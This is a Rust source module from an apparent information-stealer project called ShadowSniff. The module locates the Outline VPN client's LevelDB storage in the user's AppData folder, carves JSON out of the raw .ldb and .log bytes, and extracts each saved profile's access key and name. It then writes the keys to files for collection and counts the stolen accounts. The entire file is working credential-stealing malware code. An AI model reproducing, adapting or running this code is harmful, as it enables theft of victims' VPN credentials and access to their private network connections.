/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use alloc::format;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::{Collector, Vpn};
use derive_new::new;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, WriteTo};
use json::{Value, parse_str};
use tasks::{Task, parent_name};
use utils::sanitize_filename;

pub(super) struct OutlineVPN;

#[derive(PartialEq, Ord, Eq, PartialOrd, new)]
struct Profile {
    #[new(into)]
    access_key: Arc<str>,
    #[new(into)]
    name: Arc<str>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for OutlineVPN {
    parent_name!("Outline");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let root_path = Path::appdata() / "Outline" / "Local Storage" / "leveldb";

        let Some(files) = StorageFileSystem.list_files_filtered(root_path, &|file| {
            file.extension()
                .map(|ext| ext.ends_with("ldb") || ext.ends_with("log"))
                .unwrap_or(false)
        }) else {
            return;
        };

        let mut all_profiles: Vec<Profile> = files
            .into_iter()
            .filter_map(|path| find_json_and_extract(StorageFileSystem, path))
            .flatten()
            .collect();

        all_profiles.sort();
        all_profiles.dedup();

        if all_profiles.is_empty() {
            return;
        }

        for profile in &all_profiles {
            let path = parent / format!("{}.txt", sanitize_filename(&profile.name));
            let _ = profile.access_key.write_to(filesystem, path);
        }

        collector.get_vpn().increase_accounts_by(all_profiles.len())
    }
}

fn find_json_and_extract<R, F>(fs: R, path: Path) -> Option<Vec<Profile>>
where
    R: AsRef<F>,
    F: FileSystem,
{
    let file = fs.as_ref().read_file(path).ok()?;
    let raw_json = find_json_array(&file)?;

    let json_string = String::from_utf8_lossy(raw_json);
    let json_string_clean = json_string
        .chars()
        .filter(|&c| c != '\u{FFFD}')
        .collect::<String>()
        .replace('\0', "");

    let json = parse_str(json_string_clean).ok()?;

    extract_profiles(json)
}

fn find_json_array(bytes: &[u8]) -> Option<&[u8]> {
    let mut in_string = false;
    let mut escape = false;
    let mut bracket_count = 0usize;
    let mut start_index = None;

    for (i, &b) in bytes.iter().enumerate() {
        match b {
            b'\\' if in_string => {
                escape = !escape;
            }
            b'"' if !escape => {
                in_string = !in_string;
            }
            b'[' if !in_string => {
                if bracket_count == 0 {
                    start_index = Some(i);
                }
                bracket_count += 1;
            }
            b']' if !in_string => {
                if bracket_count > 0 {
                    bracket_count -= 1;
                    if bracket_count == 0 {
                        return start_index.map(|start| &bytes[start..=i]);
                    }
                }
            }
            _ => {
                escape = false;
            }
        }
        if b != b'\\' {
            escape = false;
        }
    }

    None
}

fn extract_profiles(json: Value) -> Option<Vec<Profile>> {
    json.as_array()?
        .iter()
        .map(|profile| {
            Some(Profile::new(
                profile.get("accessKey")?.as_string()?.clone(),
                profile.get("name")?.as_string()?.clone(),
            ))
        })
        .collect()
}
